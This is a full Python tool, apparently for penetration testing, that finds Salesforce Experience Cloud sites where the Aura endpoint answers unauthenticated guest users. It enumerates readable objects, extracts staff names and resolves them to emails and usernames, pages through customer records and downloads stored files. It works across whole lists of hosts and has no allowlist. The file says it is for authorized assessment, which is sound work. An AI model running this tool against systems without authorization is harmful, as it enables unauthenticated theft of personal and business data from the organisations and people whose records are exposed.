#!/usr/bin/env python3
"""
aurahunt — Salesforce Aura / Lightning Experience Cloud assessment tool.

Three phases:
  1. DETECT   is this an Aura community, and what is its framework context
  2. ASSESS   which controllers and sObjects answer to the *guest* user
  3. COLLECT  bounded evidence for whatever turned out to be readable

Targets the guest-user permission misconfiguration in Experience Cloud sites:
the Aura endpoint is reachable unauthenticated, and if the Guest User profile
grants object read, records come back to anyone who asks.

Written for authorized testing. See --help for the safety notes.
"""

import argparse
import concurrent.futures
import json
import os
import re
import sys
import threading
import time
from datetime import datetime, timezone
from urllib.parse import urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[!] pip install requests")

UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

CRIT, HIGH, MED, LOW, INFO = "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"
_SEV_ORDER = {CRIT: 0, HIGH: 1, MED: 2, LOW: 3, INFO: 4}

# ---------------------------------------------------------------- colour

ANSI = {
    CRIT:   "\033[1;95m", HIGH: "\033[1;91m", MED: "\033[1;93m",
    LOW:    "\033[1;96m", INFO: "\033[0;37m",
    "ok":   "\033[1;92m", "warn": "\033[0;93m", "bad": "\033[0;91m",
    "dim":  "\033[0;90m", "b": "\033[1m", "head": "\033[1;36m", "x": "\033[0m",
}
_COLOR = True


def set_color(enabled):
    global _COLOR
    _COLOR = enabled


def paint(s, key):
    return s if not _COLOR else f"{ANSI.get(key, '')}{s}{ANSI['x']}"


def status_key(code):
    try:
        code = int(code)
    except (TypeError, ValueError):
        return "dim"
    if code == 200:
        return "ok"
    if 300 <= code < 400:
        return "warn"
    if code in (401, 403):
        return "bad"
    return "dim"


# ---------------------------------------------------------------- progress

class Status:
    """
    Periodic status heartbeat for list mode (-l).

    Emitted on a timer from a daemon thread, so it fires at a steady wall-clock
    interval regardless of verbosity and regardless of how long any one host
    takes. Prints whole lines rather than redrawing in place: at -v 1 the output
    scrolls constantly, so an in-place indicator would be unreadable.

    Not used for a single target (-u) -- one host needs no queue accounting.
    """

    def __init__(self, console, total, interval=30.0, enabled=True):
        self.con = console
        self.total = total
        self.interval = interval
        self.enabled = enabled
        self.done = 0
        self.counts = {CRIT: 0, HIGH: 0, MED: 0, LOW: 0, INFO: 0}
        self._lk = threading.Lock()
        self._stop = threading.Event()
        self._thread = None
        self._t0 = 0.0

    def start(self):
        if not self.enabled:
            return
        self._t0 = time.time()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        # wait() returns True only when stop() is set, so a normal timeout emits
        while not self._stop.wait(self.interval):
            self.emit()

    def host_done(self, n=1):
        with self._lk:
            self.done += n

    def record(self, sev):
        with self._lk:
            if sev in self.counts:
                self.counts[sev] += 1

    def emit(self, label="status"):
        if not self.enabled:
            return
        with self._lk:
            done, c = self.done, dict(self.counts)
        remaining = max(0, self.total - done)
        el = int(time.time() - self._t0)
        self.con.line(paint(
            f"  [{label} {el // 60:02d}:{el % 60:02d}]  "
            f"tested {done}/{self.total}  remaining {remaining}  |  "
            f"crit {c[CRIT]}  high {c[HIGH]}  med {c[MED]}  "
            f"low {c[LOW]}  info {c[INFO]}", "head"))

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=1)


# ---------------------------------------------------------------- console

class Console:
    """v=0 prints confirmed findings only. v=1 prints every probe."""

    def __init__(self, level):
        self.level = level
        self._lk = threading.Lock()

    def line(self, msg):
        """Print one whole line atomically — used by the Status heartbeat."""
        with self._lk:
            print(msg)
            sys.stdout.flush()

    def finding(self, target, sev, title, detail=""):
        with self._lk:
            print(f"{paint('['+sev+']', sev)} {paint(target, 'b')}  {paint(title, sev)}")
            for line in (detail or "").splitlines():
                print(f"        {paint(line, 'dim')}")
            sys.stdout.flush()

    def probe(self, target, name, result, extra=""):
        if self.level < 1:
            return
        with self._lk:
            print(f"  {paint('·', 'dim')}  {paint(target, 'dim')}  "
                  f"{name:<40} {paint(str(result), status_key(result))} "
                  f"{paint(extra, 'dim')}")
            sys.stdout.flush()

    def info(self, msg):
        with self._lk:
            print(msg)
            sys.stdout.flush()

    def warn(self, msg):
        with self._lk:
            print(f"{paint('[!]', 'bad')} {msg}", file=sys.stderr)
            sys.stderr.flush()


# ---------------------------------------------------------------- http

class Http:
    def __init__(self, timeout=20, rate=8.0, verify=False, proxy=None):
        self.timeout, self.verify = timeout, verify
        self.s = requests.Session()
        self.s.headers["User-Agent"] = UA
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self._min_gap = 1.0 / rate if rate > 0 else 0.0
        self._last = 0.0
        self._lk = threading.Lock()
        self.count = 0

    def _throttle(self):
        with self._lk:
            gap = time.time() - self._last
            if gap < self._min_gap:
                time.sleep(self._min_gap - gap)
            self._last = time.time()
            self.count += 1

    def req(self, method, url, **kw):
        self._throttle()
        try:
            return self.s.request(method, url, timeout=self.timeout,
                                  verify=self.verify, proxies=self.proxies, **kw)
        except requests.RequestException:
            return None

    def get(self, url, **kw):
        return self.req("GET", url, **kw)

    def post(self, url, **kw):
        return self.req("POST", url, **kw)


class Finding:
    def __init__(self, target, sev, title, detail="", evidence=None):
        self.target, self.sev, self.title = target, sev, title
        self.detail, self.evidence = detail, evidence or {}
        self.when = datetime.now(timezone.utc).isoformat()

    def as_dict(self):
        return {"target": self.target, "severity": self.sev, "title": self.title,
                "detail": self.detail, "evidence": self.evidence, "timestamp": self.when}


# ---------------------------------------------------------------- payloads

AURA_PATHS = ["/s/sfsites/aura", "/sfsites/aura", "/aura",
              "/s/aura", "/servlet/servlet.aura"]

CTRL_HOSTCONFIG = ("serviceComponent://ui.force.components.controllers.hostConfig."
                   "HostConfigController/ACTION$getConfigData")
CTRL_GETITEMS = ("serviceComponent://ui.force.components.controllers.lists."
                 "selectableListDataProvider.SelectableListDataProviderController/"
                 "ACTION$getItems")
CTRL_RECORDUI = "aura://RecordUiController/ACTION$getRecordWithFields"
CTRL_APEX = "aura://ApexActionController/ACTION$execute"
CTRL_LISTUI = ("serviceComponent://ui.force.components.controllers.lists.listChooser."
               "ListChooserController/ACTION$getLists")

# Standard objects worth checking, ordered so the sensitive ones report first.
DEFAULT_OBJECTS = [
    "User", "Contact", "Account", "Case", "Lead", "Opportunity", "Order",
    "Contract", "Campaign", "Asset", "Quote", "Invoice", "Payment",
    "OrderItem", "OpportunityLineItem", "Product2", "Pricebook2",
    "CollaborationGroup", "CollaborationGroupMember", "FeedItem", "FeedComment",
    "ContentDocument", "ContentVersion", "ContentDocumentLink", "Attachment",
    "Document", "Note", "EmailMessage", "Task", "Event",
    "Knowledge__kav", "Topic", "TopicAssignment", "Network", "NetworkMember",
    "Group", "UserRole", "Profile", "PermissionSet", "Organization",
    "LiveChatTranscript", "Idea", "Question", "Solution", "Site",
]

# Fields to request when dereferencing a User id.
USER_FIELDS = ["User.Name", "User.Email", "User.Username", "User.Title",
               "User.Department", "User.CompanyName", "User.Phone",
               "User.MobilePhone", "User.IsActive", "User.ProfileId"]

# Objects whose exposure implies real customer/PII impact.
SENSITIVE = {"User", "Contact", "Account", "Case", "Lead", "Opportunity",
             "Order", "Contract", "Quote", "Invoice", "Payment", "OrderItem",
             "EmailMessage", "LiveChatTranscript", "Attachment", "Note",
             "FeedItem", "FeedComment", "CollaborationGroupMember"}


# ---------------------------------------------------------------- scanner

class AuraHunter:
    def __init__(self, http, console, args, status=None):
        self.h, self.con, self.args = http, console, args
        self.status = status
        self.findings = []
        self._lk = threading.Lock()

    def add(self, f):
        with self._lk:
            self.findings.append(f)
        if self.status:
            self.status.record(f.sev)
        self.con.finding(f.target, f.sev, f.title, f.detail)

    # ---------- phase 1: detection

    def _extract_context(self, html):
        """Pull the Aura framework context out of a rendered community page."""
        ctx = {}
        m = re.search(r'"fwuid"\s*:\s*"([^"]+)"', html)
        if m:
            ctx["fwuid"] = m.group(1)
        m = re.search(r'(APPLICATION@markup://[\w:.-]+)', html)
        if m:
            ctx["descriptor"] = m.group(1)
            ctx["app"] = m.group(1).split("markup://", 1)[1]
        m = re.search(r'"(APPLICATION@markup://[^"]+)"\s*:\s*"([^"]+)"', html)
        if m:
            ctx["loaded"] = {m.group(1): m.group(2)}
        m = re.search(r'"mode"\s*:\s*"(\w+)"', html)
        ctx["mode"] = m.group(1) if m else "PROD"
        m = re.search(r'"pathPrefix"\s*:\s*"([^"]*)"', html)
        ctx["pathPrefix"] = m.group(1) if m else ""
        return ctx

    def aura_context(self, ctx):
        return {"mode": ctx.get("mode", "PROD"),
                "fwuid": ctx.get("fwuid", ""),
                "app": ctx.get("app", "siteforce:communityApp"),
                "loaded": ctx.get("loaded", {}),
                "dn": [], "globals": {}, "uad": False}

    def call(self, base, path, ctx, descriptor, params, page_uri="/s/"):
        """One Aura action. Returns (state, returnValue, error, raw_status)."""
        msg = {"actions": [{"id": "123;a", "descriptor": descriptor,
                            "callingDescriptor": "UNKNOWN", "params": params}]}
        data = {"message": json.dumps(msg),
                "aura.context": json.dumps(self.aura_context(ctx)),
                "aura.pageURI": page_uri, "aura.token": "null"}
        r = self.h.post(f"{base}{path}?r=1&aura.ACTION=1", data=data,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        allow_redirects=False)
        if r is None:
            return None, None, "no response", None
        try:
            j = r.json()
        except ValueError:
            return None, None, "non-json", r.status_code
        act = (j.get("actions") or [{}])[0]
        err = ""
        if act.get("error"):
            err = (act["error"][0] or {}).get("message", "")
        return act.get("state"), act.get("returnValue"), err, r.status_code

    @staticmethod
    def _is_real_aura(resp):
        """
        Strict signature. A genuine Aura endpoint answers with a JSON envelope
        containing an "actions" array plus Aura-specific keys.

        This matters: a naive substring match on "aura" matches the request path
        echoed back inside 404 and WAF Access-Denied pages, which produces a
        flood of false positives across an estate.
        """
        if resp is None:
            return False
        body = (resp.text or "")[:4000]
        if not re.search(r'"actions"\s*:', body):
            return False
        return bool(re.search(r'"(state|descriptor|context|exceptionEvent|error|coos)"', body))

    def detect(self, base):
        r = self.h.get(base + "/", allow_redirects=True)
        if r is None:
            self.con.probe(base, "reachable", "no response")
            return None
        html = r.text or ""
        markers = len(re.findall(r"auraConfig|fwuid|markup://|siteforce|/s/sfsites", html))
        ctx = self._extract_context(html)
        self.con.probe(base, "page markers", r.status_code,
                       f"({markers} markers, fwuid={'yes' if ctx.get('fwuid') else 'no'})")

        prefix = ctx.get("pathPrefix") or ""
        candidates = list(AURA_PATHS)
        if prefix:
            candidates = [prefix + p for p in AURA_PATHS] + candidates

        for path in candidates:
            probe = self.h.post(
                f"{base}{path}?r=1&aura.ACTION=1",
                data={"message": '{"actions":[]}',
                      "aura.context": json.dumps(self.aura_context(ctx)),
                      "aura.token": "null"},
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                allow_redirects=False)
            ok = self._is_real_aura(probe)
            self.con.probe(base, f"aura endpoint {path}",
                           probe.status_code if probe is not None else "err",
                           "CONFIRMED" if ok else "(not aura)")
            if ok:
                ctx["endpoint"] = path
                self.add(Finding(
                    base, INFO, "Salesforce Aura endpoint detected",
                    f"endpoint={path}  app={ctx.get('app','?')}  "
                    f"mode={ctx.get('mode','?')}  fwuid={'extracted' if ctx.get('fwuid') else 'MISSING'}",
                    {k: v for k, v in ctx.items() if k != "loaded"}))
                if not ctx.get("fwuid"):
                    self.con.warn(f"{base}: no fwuid extracted — controller calls may fail")
                return ctx
        return None

    # ---------- phase 2: assessment

    def check_hostconfig(self, base, ctx):
        st, rv, err, _ = self.call(base, ctx["endpoint"], ctx, CTRL_HOSTCONFIG, {})
        self.con.probe(base, "HostConfigController.getConfigData", st or "err", err[:60])
        if st != "SUCCESS" or not isinstance(rv, dict):
            return None
        prefixes = rv.get("apiNamesToKeyPrefixes") or {}
        detail = []
        for k in ("defaultOrgDomain", "setupOrgOrigin", "vfDomain",
                  "currentNetworkId", "siteURLPrefix"):
            if rv.get(k):
                detail.append(f"{k}: {rv[k]}")
        if prefixes:
            custom = sorted(o for o in prefixes if o.endswith("__c"))
            ns = sorted({o.split("__")[0] for o in prefixes
                         if "__" in o and not o.endswith("__c")})
            detail.append(f"sObject API names disclosed: {len(prefixes)}")
            detail.append(f"custom objects: {len(custom)}")
            detail.append(f"managed packages: {', '.join(ns[:15])}")
        self.add(Finding(base, MED, "Org configuration disclosed to guest user",
                         "\n".join(detail),
                         {"config": {k: v for k, v in rv.items()
                                     if k != "apiNamesToKeyPrefixes"},
                          "sobject_count": len(prefixes),
                          "custom_objects": sorted(o for o in prefixes if o.endswith("__c"))}))
        return prefixes

    def enumerate_objects(self, base, ctx, objects):
        """getItems against each sObject. Non-empty result == guest can read it."""
        readable = {}
        for obj in objects:
            st, rv, err, _ = self.call(base, ctx["endpoint"], ctx, CTRL_GETITEMS,
                                       {"entityNameOrId": obj, "layoutType": "FULL",
                                        "pageSize": 5, "currentPage": 0,
                                        "useTimeout": False, "getCount": True,
                                        "enableRowActions": False})
            if st != "SUCCESS" or not isinstance(rv, dict):
                self.con.probe(base, f"sObject {obj}", st or "err", err[:50])
                continue
            rows = rv.get("result") or []
            total = rv.get("totalCount")
            self.con.probe(base, f"sObject {obj}", "SUCCESS",
                           f"(rows={len(rows)} total={total})")
            if rows:
                readable[obj] = {"total": total, "sample": rows[0].get("record", {})}
                sev = HIGH if obj in SENSITIVE else MED
                self.add(Finding(
                    base, sev, f"Guest-readable sObject: {obj}",
                    f"totalCount={total}, {len(rows)} record(s) returned unauthenticated."
                    + ("\nContains customer or personnel data — verify contents."
                       if obj in SENSITIVE else ""),
                    {"object": obj, "total": total,
                     "sample_keys": sorted(rows[0].get("record", {}).keys())[:25]}))
        return readable

    def harvest_identities(self, base, ctx, readable):
        """
        Pull user identities out of owner/creator fields on readable records,
        then try to dereference them for email/username.
        """
        ids = {}
        for obj in readable:
            st, rv, _, _ = self.call(base, ctx["endpoint"], ctx, CTRL_GETITEMS,
                                     {"entityNameOrId": obj, "layoutType": "FULL",
                                      "pageSize": 25, "currentPage": 0,
                                      "useTimeout": False, "getCount": True,
                                      "enableRowActions": False})
            if st != "SUCCESS" or not isinstance(rv, dict):
                continue
            for row in (rv.get("result") or []):
                rec = row.get("record") or {}
                for key in ("Owner", "CreatedBy", "LastModifiedBy", "Manager"):
                    ref = rec.get(key)
                    if isinstance(ref, dict) and ref.get("Id") and ref.get("Name"):
                        ids[ref["Id"]] = ref["Name"]
        if not ids:
            return {}
        self.add(Finding(base, MED, "Personnel identities disclosed via record owner fields",
                         "\n".join(f"{n}  ({i})" for i, n in list(ids.items())[:15])
                         + (f"\n… {len(ids)-15} more" if len(ids) > 15 else ""),
                         {"identities": ids}))

        deref = {}
        for uid, name in list(ids.items())[:5]:
            st, rv, err, _ = self.call(base, ctx["endpoint"], ctx, CTRL_RECORDUI,
                                       {"recordId": uid, "fields": USER_FIELDS})
            self.con.probe(base, f"deref user {uid}", st or "err", err[:50])
            if st == "SUCCESS" and rv:
                deref[uid] = rv
        if deref:
            self.add(Finding(base, HIGH, "User records dereferenceable by ID (guest)",
                             f"{len(deref)} user record(s) resolved to full field data — "
                             f"may include email and username.",
                             {"records": deref}))
        return ids

    def check_apex(self, base, ctx):
        """Is the generic Apex action controller reachable? (does not invoke logic)"""
        st, rv, err, _ = self.call(base, ctx["endpoint"], ctx, CTRL_APEX,
                                   {"namespace": "", "classname": "AuraHuntProbe",
                                    "method": "probe", "params": {},
                                    "cacheable": False, "isContinuation": False})
        self.con.probe(base, "ApexActionController.execute", st or "err", err[:70])
        # A missing-class error proves the controller is reachable and dispatching.
        if err and re.search(r"No such controller|does not exist|Invalid controller",
                             err, re.I):
            self.add(Finding(base, LOW, "ApexActionController reachable by guest",
                             "Generic Apex dispatcher answers unauthenticated. Any "
                             "@AuraEnabled method on a guest-accessible class is callable.\n"
                             f"probe error: {err[:160]}",
                             {"error": err[:400]}))

    # ---------- phase 3: bounded collection

    def collect(self, base, ctx, readable, outdir=None):
        """
        Retrieve records from readable objects, capped by --max-records.

        Bounded on purpose: enough to evidence the finding and show scale, not a
        copy of the org's data.
        """
        cap = self.args.max_records
        harvest = {}
        for obj, meta in readable.items():
            got, page = [], 0
            while len(got) < cap:
                st, rv, _, _ = self.call(base, ctx["endpoint"], ctx, CTRL_GETITEMS,
                                         {"entityNameOrId": obj, "layoutType": "FULL",
                                          "pageSize": min(25, cap - len(got)),
                                          "currentPage": page, "useTimeout": False,
                                          "getCount": True, "enableRowActions": False})
                if st != "SUCCESS" or not isinstance(rv, dict):
                    break
                rows = [r.get("record", {}) for r in (rv.get("result") or [])]
                if not rows:
                    break
                got.extend(rows)
                page += 1
                if rv.get("totalCount") is not None and len(got) >= rv["totalCount"]:
                    break
            if got:
                harvest[obj] = got
                self.con.probe(base, f"collect {obj}", "ok",
                               f"({len(got)} records, cap {cap})")

        if not harvest:
            return {}
        total = sum(len(v) for v in harvest.values())
        self.add(Finding(base, INFO, "Records collected for evidence",
                         "\n".join(f"{o}: {len(v)}" for o, v in harvest.items())
                         + f"\ntotal {total} (cap {cap} per object)",
                         {"counts": {o: len(v) for o, v in harvest.items()}}))

        if outdir:
            os.makedirs(outdir, exist_ok=True)
            tag = re.sub(r"\W+", "_", urlparse(base).hostname or "target")
            path = os.path.join(outdir, f"{tag}_records.json")
            with open(path, "w") as fh:
                json.dump(harvest, fh, indent=2, ensure_ascii=False)
            self.con.info(paint(f"    records -> {path}", "ok"))

            if self.args.download_files:
                self._download_files(base, harvest, outdir, tag)
        return harvest

    def _download_files(self, base, harvest, outdir, tag):
        """Pull ContentVersion binaries — capped by --max-files."""
        versions = harvest.get("ContentVersion") or harvest.get("ContentDocument") or []
        if not versions:
            return
        fdir = os.path.join(outdir, f"{tag}_files")
        os.makedirs(fdir, exist_ok=True)
        n = 0
        for rec in versions:
            if n >= self.args.max_files:
                break
            vid = rec.get("Id")
            if not vid:
                continue
            r = self.h.get(f"{base}/sfc/servlet.shepherd/version/download/{vid}",
                           allow_redirects=False)
            if r is not None and r.status_code == 200 and r.content:
                title = re.sub(r"\W+", "_", str(rec.get("Title") or vid))[:60]
                fn = os.path.join(fdir, f"{title}_{vid}")
                with open(fn, "wb") as fh:
                    fh.write(r.content)
                n += 1
                self.con.probe(base, f"download {vid}", 200, f"({len(r.content)}b)")
        if n:
            self.add(Finding(base, HIGH, "Guest-downloadable files retrieved",
                             f"{n} file(s) downloaded via the Shepherd servlet -> {fdir}\n"
                             f"Confirm whether these are intended public site assets "
                             f"before reporting as a leak.",
                             {"downloaded": n, "dir": fdir}))

    # ---------- driver

    def run(self, base):
        base = base.rstrip("/")
        if not urlparse(base).scheme:
            base = "https://" + base

        ctx = self.detect(base)
        if not ctx:
            self.con.probe(base, "summary", "no aura endpoint — skipping")
            return

        prefixes = self.check_hostconfig(base, ctx)
        self.check_apex(base, ctx)

        objects = list(DEFAULT_OBJECTS)
        if self.args.objects:
            objects = [o.strip() for o in self.args.objects.split(",") if o.strip()]
        elif prefixes:
            # custom objects discovered from the org schema map
            objects += sorted(o for o in prefixes if o.endswith("__c"))[:self.args.max_custom]

        readable = self.enumerate_objects(base, ctx, objects)
        if not readable:
            self.add(Finding(base, INFO, "No guest-readable sObjects found",
                             "Aura endpoint is exposed but the Guest User profile "
                             "grants no object read on the objects tested.",
                             {"tested": len(objects)}))
            return

        self.harvest_identities(base, ctx, readable)
        if self.args.collect:
            self.collect(base, ctx, readable, outdir=self.args.outdir)


# ---------------------------------------------------------------- cli

BANNER = r"""
  aurahunt — Salesforce Aura / Lightning assessment
  authorized testing only
"""

EPILOG = """
what it looks for
  Experience Cloud sites whose Guest User profile grants object read. The Aura
  endpoint is unauthenticated by design; the bug is what the guest may read
  through it.

detection
  Confirms an endpoint only when it returns a real Aura JSON envelope. A
  substring match on "aura" matches the path echoed back in 404 and WAF pages
  and will carpet an estate in false positives.

safety
  Every target you supply is requested. There is no allowlist -- feed it a
  pre-filtered, in-scope list.

  Read-only: no Aura action here writes, creates or deletes.

  Collection is capped (--max-records, --max-files). Enough to evidence the
  finding and show scale, not a copy of the org's data.

colour
  On by default. Disable with --no-color or NO_COLOR=1.

status line
  In -l mode a heartbeat prints every 30s (--status-interval) at any verbosity:
  hosts tested / total, hosts remaining, and findings by severity. Not shown
  for -u, where there is no queue to account for.

examples
  aurahunt.py -u https://community.example.com -v 1
  aurahunt.py -l hosts-scope.txt --collect --outdir evidence/
  aurahunt.py -u https://community.example.com --objects User,Contact,Case
  aurahunt.py -l hosts.txt --collect --download-files --max-records 50
"""


def main():
    ap = argparse.ArgumentParser(
        prog="aurahunt.py", description=BANNER, epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-v", type=int, default=0, choices=[0, 1], dest="verbosity",
                    help="0 = confirmed findings only (default), 1 = every probe")
    ap.add_argument("-u", "--url", help="single target URL")
    ap.add_argument("-l", "--list", help="file of target URLs, one per line")
    ap.add_argument("--no-color", action="store_true",
                    help="disable coloured output (colour is on by default)")
    ap.add_argument("--status-interval", type=float, default=30.0, metavar="SEC",
                    help="seconds between status lines in -l mode (default 30)")
    ap.add_argument("-t", "--threads", type=int, default=4, help="concurrent targets (default 4)")
    ap.add_argument("--rate", type=float, default=8.0, help="max requests/sec (default 8)")
    ap.add_argument("--timeout", type=int, default=20, help="per-request timeout (default 20)")
    ap.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 for Caido/Burp")
    ap.add_argument("--verify-tls", action="store_true", help="verify certificates (default off)")
    ap.add_argument("--objects", help="comma-separated sObject list (overrides defaults)")
    ap.add_argument("--max-custom", type=int, default=40,
                    help="max custom __c objects to test from the schema map (default 40)")
    ap.add_argument("--collect", action="store_true", help="phase 3: retrieve records")
    ap.add_argument("--max-records", type=int, default=100,
                    help="per-object record cap (default 100)")
    ap.add_argument("--download-files", action="store_true",
                    help="also download ContentVersion binaries")
    ap.add_argument("--max-files", type=int, default=10, help="file download cap (default 10)")
    ap.add_argument("--outdir", default="aurahunt-evidence", help="evidence directory")
    ap.add_argument("-o", "--json", help="write findings to JSON")
    args = ap.parse_args()

    if not args.url and not args.list:
        ap.error("need -u or -l")

    set_color(not (args.no_color or os.environ.get("NO_COLOR")))

    targets = []
    if args.url:
        targets.append(args.url.strip())
    if args.list:
        with open(args.list) as fh:
            targets += [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    targets = list(dict.fromkeys(targets))

    con = Console(args.verbosity)
    # heartbeat only in list mode (-l); a single target needs no queue accounting
    status = Status(con, len(targets), interval=args.status_interval,
                    enabled=bool(args.list))
    print(paint(BANNER, "head"))
    print(f"  targets {paint(str(len(targets)), 'b')}   threads {args.threads}   "
          f"rate {args.rate}/s")
    print(f"  collect {paint('ON', 'warn') if args.collect else paint('off', 'ok')}"
          f"        files   "
          f"{paint('ON', 'warn') if args.download_files else paint('off', 'ok')}"
          + (f"        status every {args.status_interval:.0f}s" if status.enabled else ""))
    print()

    http = Http(timeout=args.timeout, rate=args.rate, verify=args.verify_tls,
                proxy=args.proxy)
    hunter = AuraHunter(http, con, args, status)
    started = time.time()
    status.start()

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as pool:
            futs = {pool.submit(hunter.run, t): t for t in targets}
            for fut in concurrent.futures.as_completed(futs):
                try:
                    fut.result()
                except Exception as e:
                    con.warn(f"{futs[fut]}: {type(e).__name__}: {e}")
                finally:
                    status.host_done()
    finally:
        status.stop()
        status.emit(label="final")

    real = [f for f in hunter.findings if f.sev != INFO]
    print(f"\n  {paint(str(len(real)), 'b')} findings "
          f"({len(hunter.findings)} incl. info) from {http.count} requests "
          f"in {time.time()-started:.0f}s")
    for sev in (CRIT, HIGH, MED, LOW):
        n = sum(1 for f in hunter.findings if f.sev == sev)
        if n:
            print(f"    {paint(sev, sev):<20} {n}")

    if args.json:
        with open(args.json, "w") as fh:
            json.dump([f.as_dict() for f in
                       sorted(hunter.findings, key=lambda x: _SEV_ORDER[x.sev])],
                      fh, indent=2, ensure_ascii=False)
        print(f"\n  findings -> {args.json}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\ninterrupted")
